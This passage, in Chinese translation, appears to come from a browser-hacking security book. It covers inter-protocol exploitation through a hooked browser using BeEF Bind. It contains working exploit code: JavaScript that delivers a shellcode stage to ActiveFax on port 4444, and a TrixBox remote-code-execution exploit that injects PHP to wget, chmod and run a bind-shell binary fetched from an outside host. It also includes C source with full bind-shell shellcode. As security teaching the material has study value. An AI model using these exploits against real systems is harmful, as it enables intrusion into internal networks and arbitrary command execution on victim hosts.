
Level1 **1.** 一个存在漏洞的内部 IMAP 服务器通过被钩钉的浏览器被发现。 **2.** 被钩钉的浏览器利用该漏洞服务发送 XMLHttpRequest。 BeEF Bind Stager 被用作漏洞利用的负载。 **3.** 这在受影响的 IMAP 服务器上打开了 TCP 监听器，监听端口 4444，该服务器现在等待 BeEF Bind 负载的第二部分——Stage。 **4.** 被钩钉的浏览器再次向服务器的 4444 端口发送请求，使用 XMLHttpRequest.sendAsBinary，这次发送 BeEF Bind Stage。 **5.** BeEF Bind 现在已激活，允许通过标准 POST 请求向受影响的 IMAP 服务器提交任意操作系统命令。

/Level1

下一个示例再次探讨 ActiveFax，这次使用 BeEF Bind Shellcode。

### ActiveFAX Inter-protocol Exploitation Example

使用 BeEF Bind Shellcode 针对 ActiveFax，你需要对前文讨论的 ActiveFax 利用示例中的代码进行修改。你还需要向 Stager 端口发送一个额外请求，这会导致以下修改后的代码。请记住，由于不良字符限制，必须使用 alpha_mixed 编码器。

```
// BeEF bind Stage
var stage = "\xfc\xe8\x89[...snip...]";

setTimeout(function(){
  xhr.abort();
  setTimeout(function(){
    // 等待几秒以让 Stager 进入内存，然后
    // 在默认 BeEF Bind 端口 4444 上发送 Stage。
    var stage_request = "cmd=" + stage;
    sendRequest(4444, stage_request);
  }, 4000);
}, 2000);
```

发送 Stager 和 Stage 之后，你就可以与在受害系统上运行的 BeEF Bind 监听器进行通信。[Figure 10-29](#c10.html#figure10-29) 展示了通过 BeEF Bind 执行 netstat 命令的过程。

 start figure 

[**Figure 10-29:**](#c10.html#figureanchor10-29) 使用 BeEF Bind 与受 compromised 系统交互

![c10f029.tif](image_fi/662090c10/c10f029.png)

 end figure 

为简化过程，我们想使用 BeEF 的 “beef_bind_shell” 命令模块来与 Shellcode 通信。[Figure 10-30](#c10.html#figure10-30) 的图表提供了此攻击的高层次概览以及它如何基于前文的 IPE 攻击。你可以清楚地看到，双向通信通道完全通过浏览器传递，并且位于被钩钉浏览器的内部网络内部。

 start figure 

[**Figure 10-30:**](#c10.html#figureanchor10-30) ActiveFax 利用 BeEF Bind Shellcode 的高层次概览

![c10f030.tif](image_fi/662090c10/c10f030.png)

 end figure 

使用 BeEF Bind 的主要优势在于消除了对出站通信通道的猜测。你不需要预测出站开放端口，也不必使用 HTTP 或 DNS 隧道突破网络限制。你利用浏览器已经存在的通信通道，这最终提高了利用成功率。

此攻击突显了浏览器作为跳板的概念。如果你钩钉了浏览器，你就拥有了内部网络的视野。所有从被钩钉浏览器可达的内部网络系统都在那里闲置，等待被利用。那么，为什么不使用浏览器作为跳点来发送你的攻击呢？

### TrixBox Inter-protocol Exploitation Example

正如第 9 章所揭示的，TrixBox 的一个版本存在远程命令执行漏洞。前一章通过执行反向网络连接演示了该漏洞。通过 BeEF Bind 扩展此攻击，展示了如何通过被钩钉的浏览器将反向连接通道化，从而绕过潜在的防御或预防控制。

TrixBox 默认在 CentOS Linux 上运行，且其 iptables 配置默认不阻止任何入站或出站网络流量，这使其成为 BeEF Bind 的理想目标。

下面的代码被注入到受害浏览器中，利用之前讨论的相同 TrixBox 漏洞。此次，它会在目标上运行 BeEF Bind Stager 二进制文件：

```
var uri = "http://172.16.37.155/user/index.php";

/* 要与 PHP exec 执行的命令
 * 1. 获取 BeEF Bind 32 位 ELF
 * 2. 将二进制标记为可执行
 * 3. 在后台运行它
*/
var cmd = btoa("/usr/bin/wget -O /tmp/BeEF_bind " + 
"http://browserhacker.com/BeEF_bind " + 
"&& /bin/chmod +x /tmp/BeEF_bind && " + 
"/tmp/BeEF_bind > /dev/null 2>&1 & echo $!");

// POST 主体。前面的命令从 Base64 解码后执行
var body = "langChoice=<?php exec(base64_decode('" + cmd + "'));?>%00";
var xhr = new XMLHttpRequest();
xhr.open("POST", uri, true);
xhr.setRequestHeader("Content-Type", 
 "application/x-www-form-urlencoded");
xhr.setRequestHeader('Accept','*/*');
xhr.setRequestHeader("Accept-Language", "en");
xhr.send(body);
console.log("Sending first request with RCE vector...");

function getCookie(name){
  name += '=';
  var parts = document.cookie.split(/;\s*/);
  for (var i = 0; i < parts.length; i++){
    var part = parts[i];
    if (part.indexOf(name) == 0)
      return part.substring(name.length)
  }
  return null;
}

function trigger(){
 // 当前会话 cookie
 var phpsessid = getCookie("PHPSESSID");
 console.log("Using PHPSESSID: " + phpsessid);
 
 // 触发代码执行需要评估 PHP 的 $_SESSION 的序列化内容
 var body = "langChoice=../../../../../../../../../../tmp/sess_"
 + phpsessid + "%00";
 var xhr_trigger = new XMLHttpRequest();
 xhr.open("POST", uri, true);
 xhr.setRequestHeader("Content-Type", 
  "application/x-www-form-urlencoded");
 xhr.setRequestHeader('Accept','*/*');
 xhr.setRequestHeader("Accept-Language", "en");
 xhr.send(body);
 console.log("Sending second to trigger RCE...\n" + 
 "BeEF Bind ELF should now be listening on port 4444.");
}
setTimeout(function(){trigger();}, 3000);
```

该漏洞利用下载 BeEF Bind 二进制文件，修改其权限使其可执行，并以后台方式运行该二进制文件。

在此实例中，BeEF Bind 是一个 32 位 Linux ELF 二进制文件，包含前文讨论的 BeEF Bind Stager 功能。你可以使用以下 C 代码编译 Shellcode 为二进制文件，但它也可从 [https://browserhacker.com](https://browserhacker.com) 下载：

```
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

# Compile with GCC on Linux as the following
# gcc -fno-stack-protector -z execstack -o BeEF_bind BeEF_bind.c

int (*sc)();

char shellcode[] = "\xfc\x31\xc0\x31\xd2\x6a\x01\x5b\x50\x40"+
"\x50\x40\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\xc6\x6a\x0e\x5b"+
"\x6a\x04\x54\x6a\x02\x6a\x01\x56\x89\xe1\x6a\x66\x58\xcd\x80"+
"\x6a\x02\x5b\x52\x68\x02\x00\x11\x5c\x89\xe1\x6a\x10\x51\x56"+
"\x89\xe1\x6a\x66\x58\xcd\x80\x43\x43\x53\x56\x89\xe1\x6a\x66"+
"\x58\xcd\x80\x43\x52\x52\x56\x89\xe1\x6a\x66\x58\xcd\x80\x96"+ 
"\x93\xb8\x06\x00\x00\x00\xcd\x80\x6a\x00\x68\xff\xff\xff\xff"+
"\x6a\x22\x6a\x07\x68\x00\x10\x00\x00\x6a\x00\x89\xe3\x6a\x5a"+
"\x58\xcd\x80\x89\xc7\x66\xba\x00\x10\x89\xf9\x89\xf3\x6a\x03"+
"\x58\xcd\x80\x6a\x06\x58\xcd\x80\x81\x3f\x63\x6d\x64\x3d\x74"+
"\x03\x47\xeb\xf5\x6a\x04\x58\x01\xc7\xff\xe7";

int main(int argc, char **argv) {
   char *ptr = mmap(0, sizeof(shellcode), 
    PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE,
    -1, 0);
   if (ptr == MAP_FAILED) {perror("mmap");exit(-1);}
   memcpy(ptr, shellcode, sizeof(shellcode));
   sc = (int(*)())ptr;
   (void)((void(*)())ptr)();
   printf("\n");
   return 0;
}
```

在此阶段，你应该已经拥有正在监听 TCP 端口 4444 的 BeEF Bind Stager，如 [Figure 10-31](#c10.html#figure10-31) 所示。

 start figure 

